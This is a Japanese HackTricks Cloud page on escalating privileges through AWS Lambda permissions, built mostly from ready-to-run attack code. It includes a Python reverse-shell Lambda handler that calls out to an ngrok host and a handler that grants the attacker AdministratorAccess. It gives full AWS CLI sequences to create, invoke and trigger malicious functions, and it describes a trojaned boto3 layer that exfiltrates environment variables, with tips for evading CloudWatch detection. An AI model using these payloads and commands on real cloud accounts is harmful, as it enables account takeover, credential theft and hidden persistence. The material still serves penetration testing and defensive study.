# AWS - Lambda特権昇格

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンを入手したい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見する
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## lambda

Lambdaに関する詳細情報は以下を参照してください：

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`、`lambda:CreateFunction`**、および**`lambda:InvokeFunction`**の権限を持つユーザーは、既存のIAMロールを新しいLambda関数に渡すことで特権を昇格させることができます。関連するAWSライブラリを選択したプログラミング言語にインポートするコードを含め、それを使用して任意のアクションを実行することができます。そのコードは、AWS APIを介して関数を呼び出すことで実行される可能性があります。

攻撃者はこれを悪用して**リバースシェルを取得し、トークンを盗む**ことができます：

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
あなたは、Lambda関数自体からLambdaロールの権限を悪用することもできます。
Lambdaロールに十分な権限がある場合、それを使用して管理者権限を自分に付与することができます。
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
**潜在的な影響:** 指定された任意のLambdaサービスロールへの直接の特権昇格。

{% hint style="danger" %}
注意してください、興味深いように見えるかもしれませんが、**`lambda:InvokeAsync`** だけでは **`aws lambda invoke-async` を実行することはできません**。`lambda:InvokeFunction` も必要です。
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

前のシナリオと同様に、**`lambda:AddPermission`** の権限があれば、自分自身に **`lambda:InvokeFunction`** の権限を付与することができます。
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**潜在的な影響:** 指定された任意のLambdaサービスロールへの直接の特権昇格。

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`、`lambda:CreateFunction`、`lambda:CreateEventSourceMapping`**（およびおそらく`dynamodb:PutItem`と`dynamodb:CreateTable`）の権限を持つユーザーは、**`lambda:InvokeFunction`の権限を持たない**場合でも、特権を昇格させることができます。これは、既存のIAMロールを新しいLambda関数に**渡すこと**で実現されます。ユーザーは、関連するAWSライブラリを自分の選んだプログラミング言語にインポートするコードを含めたLambda関数を作成し、それを使用して任意のアクションを実行します。その後、**DynamoDBテーブルを作成するか既存のテーブルを使用**して、Lambda関数にそのDynamoDBテーブルを指すイベントソースマッピングを作成する必要があります。その後、テーブルにアイテムを追加するか、別の方法でテーブルにアイテムが追加されるのを待つ必要があります。そうすることで、**Lambda関数が呼び出されます**。
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
**コード**は、Pythonファイル内で**対象のロールを利用**することになります。前の方法で使用されたスクリプトと同じ例です。

その後のステップは、現在のAWS環境でDynamoDBが使用されているかどうかによって異なります。もしDynamoDBが使用されている場合は、Lambda関数のために**イベントソースマッピングを作成**するだけで済みます。しかし、使用されていない場合は、攻撃者は以下のコマンドで**ストリーミングが有効なテーブルを作成する必要があります**。
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
このコマンドの後、攻撃者は次のコマンドを使用して、Lambda関数とDynamoDBテーブルを**イベントソースマッピングを作成**して**接続**します。
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
今、Lambda関数とストリームが接続されているので、攻撃者はDynamoDBストリームをトリガーしてLambda関数を呼び出すことができます。これは、次のコマンドを使用してDynamoDBテーブルにアイテムを追加することで行われます。
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
この時点で、Lambda関数が呼び出され、攻撃者はAWSアカウントの管理者になります。

**潜在的な影響:** 指定されたLambdaサービスロールへの直接特権昇格。

### `lambda:AddPermission`

この権限を持つ攻撃者は、**自分自身（または他のユーザー）に任意の権限を付与**することができます（これにより、リソースへのアクセス権限を付与するためのリソースベースのポリシーが生成されます）：

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**潜在的な影響:** コードの変更と実行の許可を与えることで、Lambdaサービスロールへの直接的な特権昇格が可能となります。

### `lambda:AddLayerVersionPermission`

この権限を持つ攻撃者は、自分自身（または他のユーザー）に`lambda:GetLayerVersion`の権限を与えることができます。彼はレイヤーにアクセスし、脆弱性や機密情報を検索することができます。

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**潜在的な影響:** 機密情報へのアクセスの可能性。

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** 権限を持つ攻撃者は、**IAMロールがアタッチされた既存のLambda関数のコードを更新**することができます。それにより、関数は該当するAWSライブラリをインポートし、その役割を代表してアクションを実行することができます。攻撃者は、**直接実行することができない場合は、関数が呼び出されるのを待つ必要があります**が、既に存在している場合、呼び出される方法がある可能性があります。
```bash
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not checki if it's exposed in any URL or via an API gateway you could access
```
関連する**.zipファイルには、Lambdaの役割を利用するコードが含まれています**。例として、以前の方法のコードスニペットが含まれる場合があります。

**潜在的な影響:** 使用されるLambdaサービスの役割への直接の特権昇格。

### `lambda:UpdateFunctionConfiguration`

#### 概要

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html)を使用すると、**コードを別々に保存**しながら、Lambda関数に**コードを含める**ことができます。そのため、関数コードを小さく保ちながら、**複数の関数でコードを共有**することができます。

Lambda内部では、次のような関数を使用して、Pythonコードがロードされるパスを確認できます。
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
これらは場所です：

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

たとえば、ライブラリboto3は`/var/runtime/boto3`（4番目の位置）からロードされます。

#### 悪用

**関数にレイヤーをアタッチする**には、`lambda:UpdateFunctionConfiguration`の権限のみが必要であり、**レイヤーはクロスアカウントで共有できます**。また、**どのライブラリを使用しているか**を知る必要がありますので、正しく上書きすることができますが、この例では、攻撃対象の関数がboto3をインポートしていると仮定します。

安全のために、Lambdaランタイムからターゲットとしているboto3ライブラリと同じバージョン（Python 3.7）をPipを使用してインストールします。これにより、ターゲット関数で問題が発生する可能性がある異なる要素がないようにします。現在のランタイムでは、boto3バージョン1.9.42が使用されています。

次のコードで、boto3バージョン1.9.42とその依存関係をローカルの「lambda\_layer」フォルダにインストールします：
```
pip3 install -t ./lambda_layer boto3==1.9.42
```
次に、`/lambda_layer/boto3/__init__.py`を開き、悪意のあるコードを追加します。追加するペイロードは以下のようになります：

![](<../../../.gitbook/assets/image (26).png>)

`requests`は`botocore`からインポートされています。この関数は環境変数を外部に流出させますが、try-exceptと0.1秒のタイムアウトは、このコードが何も壊れないようにするためにあります。

{% hint style="info" %}
**重要な注意点：**実際のペンテストでは、もはや`botocore.vendored`から`requests`をインポートしないでください。なぜなら、その関数のCloudWatchログに「DeprecationWarning」が表示され、それによって防御側に発見される可能性が高くなるからです。
{% endhint %}

それでは、そのコードを**ZIPファイル**にまとめ、それを**攻撃者アカウントの新しいLambdaレイヤーにアップロード**します。まず、「python」というフォルダを作成し、ライブラリをそこに配置する必要があります。これにより、Lambdaにアップロードした後、コードは「/opt/python/boto3」で見つかるようになります。また、レイヤーがPython 3.7と互換性があり、**レイヤーが対象の関数と同じリージョンにあることを確認**してください。それが完了したら、`lambda:AddLayerVersionPermission`を使用して、レイヤーを**パブリックにアクセス可能**にします。このAPI呼び出しには、個人のAWS認証情報を使用してください。
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
現在、私たちが持っている**侵害された資格情報**を使用して、ターゲットのLambda関数「s3-getter」で以下のコマンドを実行します。これにより、**クロスアカウントのLambdaレイヤーがアタッチ**されます。
```
aws lambda update-function-configuration \
--function-name s3-getter \
--layers arn:aws:lambda:REGION:OUR-ACCOUNT-ID:layer:boto3:1
```
次のステップは、**関数を自分で呼び出す**か、通常の手段で**呼び出されるのを待つ**ことです-これが安全な方法です。

この脆弱性を悪用する**よりステルスな方法**は、次の場所にあります：

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**潜在的な影響：**使用されているLambdaサービスロールへの直接の特権昇格。

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

これらの権限を持っている場合、関数を作成し、URLを呼び出して実行することができるかもしれません...しかし、私はそれをテストする方法を見つけることができませんでしたので、できるかどうか教えてください！

### Lambda MitM

一部のLambdaは、**ユーザーからパラメーターで機密情報を受け取る**ことになります。もし、そのうちの1つでRCEを取得した場合、他のユーザーがそれに送信している情報を外部に流出させることができます。詳細は次の場所で確認してください：

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もし、**HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンにアクセスしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)を手に入れましょう。
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **ハッキングのトリックを共有するために、**[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>
